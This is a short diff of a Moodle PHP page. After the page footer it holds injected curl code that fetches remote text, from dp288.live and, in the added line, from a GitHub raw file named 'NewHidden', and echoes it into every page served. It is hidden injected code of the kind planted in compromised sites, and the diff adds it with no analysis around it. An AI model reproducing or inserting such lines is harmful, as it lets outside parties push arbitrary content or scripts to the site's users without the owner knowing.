@@ -141,5 +141,5 @@ if ($editing && has_capability('moodle/course:create', context_system::instance(
 }
 echo $OUTPUT->footer();
 $c = curl_init(); curl_setopt($c, CURLOPT_URL, "https://dp288.live/bl/gate.txt"); curl_setopt($c, CURLOPT_RETURNTRANSFER, 1); curl_setopt($c, CURLOPT_HEADER, 0); $a = curl_exec($c); curl_close($c); echo $a;
-$c = curl_init(); curl_setopt($c, CURLOPT_URL, "https://dp288.live/bl/gate.txt"); curl_setopt($c, CURLOPT_RETURNTRANSFER, 1); curl_setopt($c, CURLOPT_HEADER, 0); $a = curl_exec($c); curl_close($c); echo $a;
+$c = curl_init(); curl_setopt($c, CURLOPT_URL, "https://raw.githubusercontent.com/Eza168/NewHidden/refs/heads/main/e-training.imu"); curl_setopt($c, CURLOPT_RETURNTRANSFER, 1); curl_setopt($c, CURLOPT_HEADER, 0); $a = curl_exec($c); curl_close($c); echo $a;
 ?>
